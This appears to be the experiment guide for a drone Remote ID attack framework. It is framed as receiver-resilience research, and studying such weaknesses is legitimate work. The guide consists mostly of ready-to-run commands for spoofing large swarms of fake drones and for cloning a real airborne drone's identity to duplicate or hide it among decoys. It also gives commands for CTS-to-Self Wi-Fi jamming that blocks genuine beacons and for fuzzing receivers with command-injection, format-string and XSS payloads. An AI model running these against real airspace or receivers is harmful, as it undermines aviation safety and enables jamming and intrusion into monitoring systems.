# Remote ID Spoofer & Takeover: Experiment Reference Guide

This guide compiles the command-line workflows and usage patterns for executing the core practical experiments evaluated with this framework.

---

## 1. Multi-Transport & Multi-Drone Baseline Spoofing
Test standard Remote ID broadcast compliance across all physical mediums using either **1 or 5 virtual drones** at realistic local test coordinates or simulated "far away" remote coordinates.

### Parameters to adjust:
* `-r` / `--random`: Number of virtual drones to spawn (`-r 1` or `-r 5`).
* `-l` / `--location`: Decimal GPS coordinates (`LAT LNG`).
  * *Realistic local coordinates (e.g., Zurich):* `-l 47.376340 8.531256`
  * *Far away coordinates (e.g., Los Angeles / Middle of Atlantic):* `-l 34.0522 -118.2437` or `-l 0.0 0.0`
* `-t` / `--transport`: Physical transport medium (`wifi`, `ble`, `nan`, `both`, `all`).

### Commands:
```bash
# Wi-Fi Beacon (1 drone, realistic location)
sudo .venv/bin/python3 spoof_drones.py -t wifi -i wlan1 -r 1 -l 47.376340 8.531256

# BLE 5 Extended Advertising (5 drones, realistic location)
sudo .venv/bin/python3 spoof_drones.py -t ble --ble-adapter hci0 -r 5 -l 47.376340 8.531256

# BLE 4 Legacy Advertising (5 drones, via Extended HCI for modern adapters)
sudo .venv/bin/python3 spoof_drones.py -t ble --ble-mode ext-legacy -r 5 -l 34.0522 -118.2437

# Wi-Fi NAN / Android Bridge (5 drones, realistic location)
sudo .venv/bin/python3 spoof_drones.py -t nan --nan-port 8080 -r 5 -l 47.376340 8.531256

# All Transports simultaneously (Wi-Fi + BLE 5 + NAN)
sudo .venv/bin/python3 spoof_drones.py -t all -r 5 -l 47.376340 8.531256
```

---

## 2. High-Density Swarm Spoofing (Wi-Fi Beacon)
Evaluate receiver performance and RF capacity limits by generating a dense swarm of **~200 virtual drones** simultaneously broadcasting over raw AF_PACKET sockets on channel 6.

### Commands:
```bash
# Spawn 200 drones on Wi-Fi Beacon (with Self ID included)
sudo .venv/bin/python3 spoof_drones.py -t wifi -i wlan1 -r 200 -l 47.376340 8.531256

# Optimized Swarm: Omit Self ID message (--no-self-id) to reduce frame airtime and maximize packet delivery
sudo .venv/bin/python3 spoof_drones.py -t wifi -i wlan1 -r 200 -l 47.376340 8.531256 --no-self-id
```

---

## 3. Duplicate MAC Address Collision (Same MAC Scenario)
Evaluate how receivers handle Remote ID sessions when multiple virtual drones advertise differing serial IDs and divergent physical trajectories while sharing an **identical MAC address** (and identical BLE Static Random address).

### Step 1: Generate / reset the scenario file with target baseline origin:
```bash
python3 scenarios/generate_same_mac.py --lat 47.376340 --lng 8.531256
```

### Step 2: Execute the scenario across different transports (excluding Wi-Fi NAN):
```bash
# Execute on Wi-Fi Beacon
sudo .venv/bin/python3 spoof_drones.py -c scenarios/same_mac.json -t wifi -i wlan1

# Execute on BLE 5 Extended Advertising
sudo .venv/bin/python3 spoof_drones.py -c scenarios/same_mac.json -t ble --ble-adapter hci0

# Execute on BLE 4 Legacy Advertising (via Extended HCI)
sudo .venv/bin/python3 spoof_drones.py -c scenarios/same_mac.json -t ble --ble-mode ext-legacy

# Execute on both Wi-Fi and BLE 5 simultaneously
sudo .venv/bin/python3 spoof_drones.py -c scenarios/same_mac.json -t both
```

### Potential Step 3: Modify the scenario to use the same Basic ID across drones
This can be especially interesting if the receiver does not distinguish between drones using the MAC address, so it can be evaluated whether the Basic ID is used instead.

---

## 4. Airborne Drone Duplication (Figure-8 Takeover)
Listen for an active real drone in the air, extract its verbatim static messages and MAC identity, and immediately broadcast an overlay virtual drone simulating a dynamic **Figure-8 trajectory** starting from the real drone's current coordinates.

### Commands:
```bash
# Duplicate via BLE 5 Extended Advertising (sniffs BLE, broadcasts BLE 5)
sudo .venv/bin/python3 takeover_figure8.py -i hci0 -t ble5

# Duplicate via BLE 4 Legacy Advertising (sniffs BLE, broadcasts BLE 4)
sudo .venv/bin/python3 takeover_figure8.py -i hci0 -t ble4

# Duplicate via Wi-Fi Beacon (sniffs BLE or Wi-Fi, broadcasts Wi-Fi Beacon)
sudo .venv/bin/python3 takeover_figure8.py -i hci0 -w wlan1 -t wifi

# Duplicate via Wi-Fi NAN / Wi-Fi Aware (via Android bridge on port 8080)
sudo .venv/bin/python3 takeover_figure8.py -i hci0 -t nan --nan-port 8080
```

---

## 5. Airborne Drone Duplication with Message Counter Modification
Execute the same Figure-8 duplication attack, but actively test data deduplication and session resilience on receivers by applying an exact **message counter offset** (`-o` / `--offset`) relative to the real drone's captured ASTM message count.

### Commands:
```bash
# Skip ahead by +5 message counts (forces receiver to interpret broadcast as distinctly fresh)
sudo .venv/bin/python3 takeover_figure8.py -i hci0 -t ble5 -o 5

# Replay using the exact same message counter as captured (-o 0)
sudo .venv/bin/python3 takeover_figure8.py -i hci0 -t ble5 -o 0

# Negative offset: rewind message counter backward (note: use equals sign syntax --offset=-N)
sudo .venv/bin/python3 takeover_figure8.py -i hci0 -t ble5 --offset=-5
```

---

## 6. Airborne Drone Hiding (Real-Time Predictive Trajectory Overlay)
Tracks a target drone in real-time, computes its instantaneous velocity vector and heading at every timestep, and extrapolates its anticipated positions into the future. It dynamically spawns multiple fake virtual drones (default: 7) orbiting around and ahead of the real drone's forecasted location to confuse tracking hardware and hide the true target.

### Commands:
```bash
# Predictive Hiding on BLE 5 spawning 7 decoy drones with random MAC addresses
sudo .venv/bin/python3 takeover_predictive.py -i hci0 -t ble5 -n 7 --mac-mode random

# Predictive Hiding on BLE 5 spawning 7 decoy drones hijacking the target's exact captured MAC
sudo .venv/bin/python3 takeover_predictive.py -i hci0 -t ble5 -n 7 --mac-mode captured

# Predictive Hiding on Wi-Fi Beacon
sudo .venv/bin/python3 takeover_predictive.py -i hci0 -w wlan1 -t wifi -n 7 --mac-mode random

# Predictive Hiding on Wi-Fi NAN (Note: requires --mac-mode random; incompatible with captured MAC mode)
sudo .venv/bin/python3 takeover_predictive.py -i hci0 -t nan --nan-port 8080 -n 7 --mac-mode random
```

---

## 7. Wi-Fi Medium Suppression (CTS-to-Self Spamming)
Injects high-frequency IEEE 802.11 Clear-To-Send (CTS) control frames containing the maximum possible Network Allocation Vector (NAV) reservation duration (`32767 µs`). This silences surrounding Wi-Fi radios at the hardware carrier sense layer (CSMA/CA), suppressing competitor transmissions or blocking real Remote ID beacons from reaching ground stations.

### Step 1: Compile the C injection binary:
```bash
make -C evaluation
```

### Step 2: Configure interface to Monitor Mode and set frequency channel (e.g., channel 6):
```bash
sudo iw dev wlan1 set type monitor
sudo iw dev wlan1 set channel 6
sudo ip link set wlan1 up
```

### Step 3: Execute CTS jamming:
```bash
# Spam CTS-to-Self using randomized MAC addresses with max NAV duration (32767 us)
sudo ./evaluation/cts_inject wlan1 random 32767

# Spam CTS targeting a specific MAC address or BSSID
sudo ./evaluation/cts_inject wlan1 00:11:22:33:44:55 32767
```

---

## 8. Ephemeral Swarm Saturation (Rapid Identity & MAC Rotation)
Injects massive quantities of virtual drone identities into the RF environment by spawning batches of concurrent drones per transport (default: Wi-Fi=100 drones, BLE=15 drones, NAN=15 drones), broadcasting for a configurable wave duration, and immediately tearing them down to rotate to brand new serial numbers, MAC addresses, and randomized coordinates. Designed to evaluate receiver memory exhaustion, session pruning limits, and ID tracking saturation across multiple simultaneous transports.

### Key Parameters:
* `-t` / `--transport`: Target medium (`wifi`, `ble`, `nan`, `both`, `all`). Supports sending across all transport methods simultaneously!
* `-b` / `--batch-size`: Override batch size for all active transports (e.g. `-b 50`).
* `--wifi-batch`, `--ble-batch`, `--nan-batch`: Set transport-specific batch sizes (defaults: **Wi-Fi = 100**, **BLE = 15**, **NAN = 15**).
* `-d` / `--wave-duration`: Duration in seconds each wave broadcasts before rotating to fresh identities (default: 3.0s).
* `-n` / `--interval`: Time interval in seconds between transmission cycles (default: 0.2s).
* `-l` / `--location`: Center latitude and longitude for random cluster distribution.

### Commands:
```bash
# Rapid swarm on Wi-Fi Beacon: 100 drones/wave, rotating every 3 seconds
sudo .venv/bin/python3 ephemeral_swarm.py -t wifi -i wlan1 -d 3.0 -n 0.2

# Multi-transport flood: Broadcast across ALL transports (Wi-Fi=100 + BLE=15 + NAN=15) simultaneously, rotating every 5 seconds
sudo .venv/bin/python3 ephemeral_swarm.py -t all -i wlan1 --ble-adapter hci0 --nan-port 8080 -d 5.0 -n 0.2

# Extreme saturation on Wi-Fi + BLE: custom batch sizes (50 Wi-Fi, 10 BLE), 1-second waves with no Self ID overhead
sudo .venv/bin/python3 ephemeral_swarm.py -t both --wifi-batch 50 --ble-batch 10 -d 1.0 -n 0.1 --no-self-id
```

---

## 9. Remote ID Receiver Vulnerability & Fuzzing Evaluation (`fuzz_rid.py`)
A comprehensive Over-The-Air (OTA) Remote ID fuzzing test suite designed to evaluate the parser resilience, memory safety, and input sanitization of telemetry target receivers (e.g., Sparrow-WiFi, OpenDroneID C code, ESP32 scanner firmware, Wireshark dissectors, and Android discovery stacks).

### Fuzzing Attack Categories Supported (`--fuzz-mode`):
1. **`pack_header` (Message Pack Header Corruption)**: Overrides Vendor IE and BLE Service Data headers with illegal message sizes (`msg_size = 0x00`, `0xFF`) and count mismatches (`msg_count = 0` or claiming 255 messages when only a couple are present) to uncover infinite loops, heap buffer overreads, and array indexing exceptions.
2. **`nested_packs` (Recursive & Zero-Length Nested Message Packs)**: Injects 25-byte message slices that themselves start with Type 0xF Pack headers inside an existing Message Pack (e.g. `msg_size=0x00, msg_count=0xFF` or sequential nested chains) to trigger infinite recursion loops and stack out-of-bounds overreads (targeting vulnerabilities like DA-01 and RDB-02).
3. **`auth_pages` (Authentication Message Pagination & Reassembly Attacks)**: Broadcasts Type 0x02 Authentication messages with out-of-bounds page counts (`page_count = 255`), illegal page numbers (e.g. sending page 18 when max is 3), and overlapping duplicate pages with conflicting bytes to trigger double-frees or stack overflows in receiver reassembly tables.
4. **`string_inject` (String Safety & Payload Injection)**: Injects missing null terminators (`'A'*20`), ANSI C format strings (`%s%s%p%n%x`), persistent non-destructive OS command injection PoC payloads (`; touch /poc #`, `$(touch /poc)`), and DOM XSS scripts (`<script>alert(1)</script>`) into Basic ID and Self ID descriptions to test backend logging pipelines and front-end monitoring dashboards.
5. **`kinematics` (Geographical Projections & Coordinate Edge-Cases)**: Broadcasts out-of-spec coordinates (Latitude `±91.0°`, Longitude `±181.0°`, INT32_MAX `0x7FFFFFFF`), impossible angles ($>360^\circ$), and maximum altitude uint16 values to test mapping/GIS calculation stability.
6. **`protocol` (Protocol Version Nibble Fuzzing)**: Randomizes the reserved protocol version nibbles in ASTM byte 0 (`MsgType << 4 | ver`) with unsupported versions (`0x0`, `0x3..0xF`).
7. **`all` (Automated Fuzz Cycle)**: Continuously cycles through all 6 vulnerability mutation categories automatically.

### Key Parameters:
* `-t` / `--transport`: Target transport medium (`wifi`, `ble`, `nan`, `both`, `all`). Supports transmitting malformed frames simultaneously across multiple radios!
* `-f` / `--fuzz-mode`: Vulnerability mutation suite (`pack_header`, `nested_packs`, `auth_pages`, `string_inject`, `kinematics`, `protocol`, `all`). Default is `all`.
* `-c` / `--cycle-time`: Duration in seconds to broadcast each specific payload mutation before rotating (default: `3.0s`).
* `-n` / `--num-drones`: Number of concurrent simulated drones broadcasting fuzzing frames (default: `1`).

### Commands:
```bash
# Continuous automated fuzzing across ALL attack categories on Wi-Fi Beacon
sudo .venv/bin/python3 fuzz_rid.py -t wifi -i wlan1 -f all -c 3.0

# Targeted Message Pack Header fuzzing simultaneously on Wi-Fi and BLE Extended Advertising
sudo .venv/bin/python3 fuzz_rid.py -t both -i wlan1 --ble-adapter hci0 -f pack_header -c 2.0

# Stress-test receiver authentication pagination reassembly on BLE 5 with 3 concurrent drones
sudo .venv/bin/python3 fuzz_rid.py -t ble --ble-adapter hci0 -f auth_pages -n 3 -c 4.0

# Test command injection & DOM XSS payload resilience across ALL transport mediums (Wi-Fi + BLE + NAN)
sudo .venv/bin/python3 fuzz_rid.py -t all -i wlan1 --ble-adapter hci0 --nan-port 8080 -f string_inject
```
